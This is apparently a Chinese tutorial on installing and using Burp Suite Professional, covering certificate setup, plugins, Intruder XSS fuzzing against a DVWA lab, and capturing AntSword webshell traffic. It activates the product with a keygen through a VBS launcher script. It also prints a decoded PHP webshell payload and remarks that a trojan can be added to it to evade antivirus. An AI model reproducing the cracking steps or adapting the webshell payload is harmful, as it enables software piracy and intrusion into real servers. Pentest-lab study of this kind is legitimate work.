一款用于 Web 应用漏洞测试的工具

# 1 准备

需要 JRE 8 环境

- [JRE 8](https://www.java.com/en/download/manual.jsp)
- [Burp Suite Professional](https://portswigger.net/burp/releases#professional)

# 2 配置

将注册机复制到安装目录

![将注册机复制到安装目录](./../../../../images/Burp%20Suite/%E5%B0%86%E6%B3%A8%E5%86%8C%E6%9C%BA%E5%A4%8D%E5%88%B6%E5%88%B0%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95.png)

# 3 安装

运行注册机启动 Burp Suite

![运行注册机启动 Burp Suite](./../../../../images/Burp%20Suite/%E8%BF%90%E8%A1%8C%E6%B3%A8%E5%86%8C%E6%9C%BA%E5%90%AF%E5%8A%A8%20Burp%20Suite.png)

复制 License 的内容到 Enter license key

![复制 License 的内容到 Enter license key](./../../../../images/Burp%20Suite/%E5%A4%8D%E5%88%B6%20License%20%E7%9A%84%E5%86%85%E5%AE%B9%E5%88%B0%20Enter%20license%20key.png)

选择 Manual activation

![选择 Manual activation](./../../../../images/Burp%20Suite/%E9%80%89%E6%8B%A9%20Manual%20activation.png)

复制粘贴注册码

![复制粘贴注册码](./../../../../images/Burp%20Suite/%E5%A4%8D%E5%88%B6%E7%B2%98%E8%B4%B4%E6%B3%A8%E5%86%8C%E7%A0%81.png)

> 完成注册

在安装目录编写 VBS 启动脚本

```vbscript
Dim WshShell, javaPath, burpLoaderKeygen, burpSuiteJar, javaOptions

' 定义路径和参数
javaPath = "C:\Users\sec\AppData\Local\Programs\BurpSuitePro\jre\bin\java.exe"
burpLoaderKeygen = "C:\Users\sec\AppData\Local\Programs\BurpSuitePro\BurpLoaderKeygen.jar"
burpSuiteJar = "C:\Users\sec\AppData\Local\Programs\BurpSuitePro\burpsuite_pro.jar"
javaOptions = "--add-opens=java.desktop/javax.swing=ALL-UNNAMED " & _
           "--add-opens=java.base/java.lang=ALL-UNNAMED " & _
           "--add-opens=java.base/jdk.internal.org.objectweb.asm=ALL-UNNAMED " & _
           "--add-opens=java.base/jdk.internal.org.objectweb.asm.tree=ALL-UNNAMED " & _
           "--add-opens=java.base/jdk.internal.org.objectweb.asm.Opcodes=ALL-UNNAMED"

' 构建命令
Dim command
command = Chr(34) & javaPath & Chr(34) & " " & javaOptions & " -javaagent:" & Chr(34) & burpLoaderKeygen & Chr(34) & " -noverify -jar " & Chr(34) & burpSuiteJar & Chr(34)

' 执行命令
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run command, 0

```

将 Burp Suite Professional 快捷方式的目标修改为启动脚本

浏览器配置 Burp Suite 代理打开以下链接，下载 `cacert.der` 

> http://burpsuite/

![浏览器配置 Burp Suite 代理打开以下链接，下载 `cacert.der` ](./../../../../images/Burp%20Suite/%E6%B5%8F%E8%A7%88%E5%99%A8%E9%85%8D%E7%BD%AE%20Burp%20Suite%20%E4%BB%A3%E7%90%86%E6%89%93%E5%BC%80%E4%BB%A5%E4%B8%8B%E9%93%BE%E6%8E%A5%EF%BC%8C%E4%B8%8B%E8%BD%BD%20%60cacert.der%60%20.png)

双击 `cacert.der` ，安装证书

![双击 `cacert.der` ，安装证书](./../../../../images/Burp%20Suite/%E5%8F%8C%E5%87%BB%20%60cacert.der%60%20%EF%BC%8C%E5%AE%89%E8%A3%85%E8%AF%81%E4%B9%A6.png)

选择安装到当前用户

![选择安装到当前用户](./../../../../images/Burp%20Suite/%E9%80%89%E6%8B%A9%E5%AE%89%E8%A3%85%E5%88%B0%E5%BD%93%E5%89%8D%E7%94%A8%E6%88%B7.png)

选择存储到受信任的根证书颁发机构

![选择存储到受信任的根证书颁发机构](./../../../../images/Burp%20Suite/%E9%80%89%E6%8B%A9%E5%AD%98%E5%82%A8%E5%88%B0%E5%8F%97%E4%BF%A1%E4%BB%BB%E7%9A%84%E6%A0%B9%E8%AF%81%E4%B9%A6%E9%A2%81%E5%8F%91%E6%9C%BA%E6%9E%84.png)

# 4 初始化

选择临时项目

![选择临时项目](./../../../../images/Burp%20Suite/%E9%80%89%E6%8B%A9%E4%B8%B4%E6%97%B6%E9%A1%B9%E7%9B%AE.png)

使用默认配置启动

![使用默认配置启动](./../../../../images/Burp%20Suite/%E4%BD%BF%E7%94%A8%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E5%90%AF%E5%8A%A8.png)

更改外观字体大小和主题

![更改外观字体大小和主题](./../../../../images/Burp%20Suite/%E6%9B%B4%E6%94%B9%E5%A4%96%E8%A7%82%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F%E5%92%8C%E4%B8%BB%E9%A2%98.png)

设置永久折叠侧板

![设置永久折叠侧板](./../../../../images/Burp%20Suite/%E8%AE%BE%E7%BD%AE%E6%B0%B8%E4%B9%85%E6%8A%98%E5%8F%A0%E4%BE%A7%E6%9D%BF.png)

修改 HTTP 消息显示字体

![修改 HTTP 消息显示字体](./../../../../images/Burp%20Suite/%E4%BF%AE%E6%94%B9%20HTTP%20%E6%B6%88%E6%81%AF%E6%98%BE%E7%A4%BA%E5%AD%97%E4%BD%93.png)

指定 UTF-8 字符集

![指定 UTF-8 字符集](./../../../../images/Burp%20Suite/%E6%8C%87%E5%AE%9A%20UTF-8%20%E5%AD%97%E7%AC%A6%E9%9B%86.png)

配置 [Jython Standalone](https://www.jython.org/) 环境

![配置 Jython Standalone 环境](./../../../../images/Burp%20Suite/%E9%85%8D%E7%BD%AE%20Jython%20Standalone%20%E7%8E%AF%E5%A2%83.png)

保存用户设置到安装目录

![保存用户设置到安装目录](./../../../../images/Burp%20Suite/%E4%BF%9D%E5%AD%98%E7%94%A8%E6%88%B7%E8%AE%BE%E7%BD%AE%E5%88%B0%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95.png)

启动时从文件读取设置

![启动时从文件读取设置](./../../../../images/Burp%20Suite/%E5%90%AF%E5%8A%A8%E6%97%B6%E4%BB%8E%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E8%AE%BE%E7%BD%AE.png)

在安装目录创建文件夹 `Extension` 

```
C:\Users\sec\AppData\Local\Programs\BurpSuitePro\Extension
```

> 所有的扩展都要下载到这个目录中

# 5 部署

|                             插件                             |
| :----------------------------------------------------------: |
|            [HaE](https://github.com/gh0stkey/HaE)            |
| [BurpFingerPrint](https://github.com/shuanx/BurpFingerPrint) |
|   [BurpAPIFinder](https://github.com/shuanx/BurpAPIFinder)   |
|          [Knife](https://github.com/bit4woo/knife)           |
|        [OneScan](https://github.com/vaycore/OneScan)         |
|     [RouteVulScan](https://github.com/F6jO/RouteVulScan)     |
| [BurpShiroPassiveScan](https://github.com/pmiaowu/BurpShiroPassiveScan) |
| [BurpFastJsonScan](https://github.com/pmiaowu/BurpFastJsonScan) |
| [WooYun-Payload](https://github.com/boy-hack/wooyun-payload) |
|        [xia SQL](https://github.com/smxiazi/xia_sql)         |
| [Turbo Intruder](https://github.com/portswigger/turbo-intruder) |
|       [BypassPro](https://github.com/0x727/BypassPro)        |
|  [BurpFakeIP](https://github.com/TheKingOfDuck/BurpFakeIP)   |
| [captcha-killer-modified](https://github.com/f0ng/captcha-killer-modified) |
|   [Hackvertor](https://github.com/portswigger/hackvertor)    |
|    [Retire.js](https://github.com/portswigger/retire-js)     |
|     [Autorize](https://github.com/portswigger/autorize)      |
| [AutoRepeater](https://github.com/portswigger/auto-repeater) |
|        [Authz](https://github.com/PortSwigger/authz)         |

# 6 使用

## 6.1 添加扩展

添加BApp商店扩展

![添加BApp商店扩展](./../../../../images/Burp%20Suite/%E6%B7%BB%E5%8A%A0BApp%E5%95%86%E5%BA%97%E6%89%A9%E5%B1%95.png)

配置 [Jython Standalone](https://github.com/jython/jython) 环境

![配置 Jython Standalone 环境](./../../../../images/Burp%20Suite/%E9%85%8D%E7%BD%AE%20Jython%20Standalone%20%E7%8E%AF%E5%A2%83.png)

### 6.1.1 添加第三方扩展

将下载好的扩展包放在 D:\software\BurpSuitePro\Extender\ 目录中

在扩展中添加

![在扩展中添加](./../../../../images/Burp%20Suite/%E5%9C%A8%E6%89%A9%E5%B1%95%E4%B8%AD%E6%B7%BB%E5%8A%A0.png)

点击下一个

![点击下一个](./../../../../images/Burp%20Suite/%E7%82%B9%E5%87%BB%E4%B8%8B%E4%B8%80%E4%B8%AA.png)

点击关闭

![点击关闭](./../../../../images/Burp%20Suite/%E7%82%B9%E5%87%BB%E5%85%B3%E9%97%AD.png)

## 6.2 加载扩展

勾选扩展以加载

![勾选扩展以加载](./../../../../images/Burp%20Suite/%E5%8B%BE%E9%80%89%E6%89%A9%E5%B1%95%E4%BB%A5%E5%8A%A0%E8%BD%BD.png)

## 6.3 Turbo Intruder

选择 `examples/race-multi-endpoint.py`  然后在 `host` 下添加 `x-req:%s` 

Turbo Intruder 攻击示例

![Turbo Intruder 攻击示例](./../../../../images/Burp%20Suite/Turbo%20Intruder%20%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B.png)

其中 GET 和 POST 请求默认各 5 次，可在这里修改

![其中 GET 和 POST 请求默认各 5 次，可在这里修改](./../../../../images/Burp Suite/其中 GET 和 POST 请求默认各 5 次，可在这里修改.png)

## 6.4 拦截请求

![拦截请求](./../../../../images/Burp%20Suite/%E6%8B%A6%E6%88%AA%E8%AF%B7%E6%B1%82.png)

## 6.5 爆破时处理 payload

![爆破时处理 payload](./../../../../images/Burp%20Suite/%E7%88%86%E7%A0%B4%E6%97%B6%E5%A4%84%E7%90%86%20Payload.png)

## 6.6 comparer 对比

## 6.7在本地侦听其它计算机

将代理指定为本机 IP

![将代理指定为本机 IP](./../../../../images/Burp%20Suite/%E5%B0%86%E4%BB%A3%E7%90%86%E6%8C%87%E5%AE%9A%E4%B8%BA%E6%9C%AC%E6%9C%BA%20IP.png)

在其它计算机配置代理

```
192.168.1.102：8080
```

访问 http://burpsuite/ ,安装证书后，可通过 BurpSuite 代理正常访问

## 6.8 捕获蚁剑连接木马的数据包

使用 BurpSuite 对蚁剑连接一句话木马抓包，分析虚拟终端原理

关闭拦截

![关闭拦截](./../../../../images/Burp%20Suite/%E5%85%B3%E9%97%AD%E6%8B%A6%E6%88%AA.png)

添加代理

> 需要添加一个目标能访问到的代理

![添加代理 1](./../../../../images/Burp%20Suite/%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%90%86%201.png)

![添加代理 2](./../../../../images/Burp%20Suite/%E6%B7%BB%E5%8A%A0%E4%BB%A3%E7%90%86%202.png)

给蚁剑配置代理

![给蚁剑配置代理 1](./../../../../images/Burp%20Suite/%E7%BB%99%E8%9A%81%E5%89%91%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%201.png)

![给蚁剑配置代理 2](./../../../../images/Burp%20Suite/%E7%BB%99%E8%9A%81%E5%89%91%E9%85%8D%E7%BD%AE%E4%BB%A3%E7%90%86%202.png)

在 HTTP 历史记录中查看，用蚁剑连接目标后刷新

![在 HTTP 历史记录中查看，用蚁剑连接目标后刷新](./../../../../images/Burp%20Suite/%E5%9C%A8%20HTTP%20%E5%8E%86%E5%8F%B2%E8%AE%B0%E5%BD%95%E4%B8%AD%E6%9F%A5%E7%9C%8B%EF%BC%8C%E7%94%A8%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E7%9B%AE%E6%A0%87%E5%90%8E%E5%88%B7%E6%96%B0.png)

> 捕获到了数据包

选中可查看捕获的数据包

![选中可查看捕获的数据包](./../../../../images/Burp%20Suite/%E9%80%89%E4%B8%AD%E5%8F%AF%E6%9F%A5%E7%9C%8B%E6%8D%95%E8%8E%B7%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85.png)

### 6.8.1 修改请求数据包

打开拦截

![打开拦截](./../../../../images/Burp%20Suite/%E6%89%93%E5%BC%80%E6%8B%A6%E6%88%AA.png)

蚁剑连接到目标刷新

![蚁剑连接到目标刷新](./../../../../images/Burp%20Suite/%E8%9A%81%E5%89%91%E8%BF%9E%E6%8E%A5%E5%88%B0%E7%9B%AE%E6%A0%87%E5%88%B7%E6%96%B0.png)

> 可以看到，由于开启了拦截，蚁剑无法连接到到目标。

复制编码

![复制编码](./../../../../images/Burp%20Suite/%E5%A4%8D%E5%88%B6%E7%BC%96%E7%A0%81.png)

粘贴到编码工具中用 URL 解码

![粘贴到编码工具中用 URL 解码](./../../../../images/Burp%20Suite/%E7%B2%98%E8%B4%B4%E5%88%B0%E7%BC%96%E7%A0%81%E5%B7%A5%E5%85%B7%E4%B8%AD%E7%94%A8%20URL%20%E8%A7%A3%E7%A0%81.png)

复制解码后的文本到文本编辑器查看

```php
@ini_set("display_errors", "0");@set_time_limit(0);$opdir=@ini_get("open_basedir");if($opdir) {$ocwd=dirname($_SERVER["SCRIPT_FILENAME"]);$oparr=preg_split(base64_decode("Lzt8Oi8="),$opdir);@array_push($oparr,$ocwd,sys_get_temp_dir());foreach($oparr as $item) {if(!@is_writable($item)){continue;};$tmdir=$item."/.70f94b11fb2c";@mkdir($tmdir);if(!@file_exists($tmdir)){continue;}$tmdir=realpath($tmdir);@chdir($tmdir);@ini_set("open_basedir", "..");$cntarr=@preg_split("/\\\\|\//",$tmdir);for($i=0;$i<sizeof($cntarr);$i++){@chdir("..");};@ini_set("open_basedir","/");@rmdir($tmdir);break;};};;function asenc($out){return $out;};function asoutput(){$output=ob_get_contents();ob_end_clean();echo "4435"."fedf3";echo @asenc($output);echo "aac1b5"."3e6fee";}ob_start();try{$D=base64_decode(substr($_POST["v8255f661bbec7"],2));$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D.$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="	".$T."	".@filesize($P)."	".$E."
";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};}catch(Exception $e){echo "ERROR://".$e->getMessage();};asoutput();die();&v8255f661bbec7=CsL3Zhci93d3cvaHRtbC91cGxvYWQv
```

> 可以在原有代码的基础上加入木马，做免杀。

## 6.9 自动化测试 XSS 漏洞

burp 开启拦截，提交任意参数，发送请求数据包到 intruder 中

> http://centos7-6.local/dvwa/vulnerabilities/xss_r/

清除 payload 位置，选中需要注入的位置添加 payload 位置

```
§123§
```

上传 xss 字典到桌面

> kali 的字典在
>
>  /usr/share/wordlists/wfuzz/Injections/XSS.txt

payload 类型选择为指定文件

![payload 类型选择为指定文件](./../../../../images/Burp%20Suite/Payload%20%E7%B1%BB%E5%9E%8B%E9%80%89%E6%8B%A9%E4%B8%BA%E6%8C%87%E5%AE%9A%E6%96%87%E4%BB%B6.png)

在 payload 中加载字典

![在 payload 中加载字典](./../../../../images/Burp%20Suite/%E5%9C%A8%20Payload%20%E4%B8%AD%E5%8A%A0%E8%BD%BD%E5%AD%97%E5%85%B8.png)

> 字典不要放在中文路径下
>
> 如果字典中有编码，可能需要关闭 payload 编码，避免二次编码
>
> 最大并发请求：1

点击开始攻击，测试在结果中的响应，查看是否有过滤，转义

在设置中开启检索 - Payloads

![在设置中开启检索 - Payloads](./../../../../images/Burp%20Suite/%E5%9C%A8%E8%AE%BE%E7%BD%AE%E4%B8%AD%E5%BC%80%E5%90%AF%E6%A3%80%E7%B4%A2%20-%20Payloads.png)

再次攻击

查看结果

![查看结果](./../../../../images/Burp%20Suite/%E6%9F%A5%E7%9C%8B%E7%BB%93%E6%9E%9C.png)

> 在 P grep 一栏中，参数为 1 的，说明成功执行

## 6.10 漏洞扫描

关闭拦截

在获得的网站数据右键，主动扫描此分支

![在获得的网站数据右键，主动扫描此分支](./../../../../images/Burp%20Suite/%E5%9C%A8%E8%8E%B7%E5%BE%97%E7%9A%84%E7%BD%91%E7%AB%99%E6%95%B0%E6%8D%AE%E5%8F%B3%E9%94%AE%EF%BC%8C%E4%B8%BB%E5%8A%A8%E6%89%AB%E6%8F%8F%E6%AD%A4%E5%88%86%E6%94%AF.png)

在目标网站提交多处任意内容，增加扫描范围

> 开始扫描以后可在仪表盘中查看扫描结果
>
> 要提高扫描率可加载相应的插件

安装某些插件时，需要在扩展设置中安装环境

![安装某些插件时，需要在扩展设置中安装环境](./../../../../images/Burp%20Suite/%E5%AE%89%E8%A3%85%E6%9F%90%E4%BA%9B%E6%8F%92%E4%BB%B6%E6%97%B6%EF%BC%8C%E9%9C%80%E8%A6%81%E5%9C%A8%E6%89%A9%E5%B1%95%E8%AE%BE%E7%BD%AE%E4%B8%AD%E5%AE%89%E8%A3%85%E7%8E%AF%E5%A2%83.png)

其中扫描某些页面时会有无效信息，占用时间，需要删除

![其中扫描某些页面时会有无效信息，占用时间，需要删除](./../../../../images/Burp%20Suite/%E5%85%B6%E4%B8%AD%E6%89%AB%E6%8F%8F%E6%9F%90%E4%BA%9B%E9%A1%B5%E9%9D%A2%E6%97%B6%E4%BC%9A%E6%9C%89%E6%97%A0%E6%95%88%E4%BF%A1%E6%81%AF%EF%BC%8C%E5%8D%A0%E7%94%A8%E6%97%B6%E9%97%B4%EF%BC%8C%E9%9C%80%E8%A6%81%E5%88%A0%E9%99%A4.png)

> 以上页面是谷歌验证码

---

参考链接

- [Burp Suite](https://portswigger.net/burp) 
- [Burp Suite documentation](https://portswigger.net/burp/documentation)
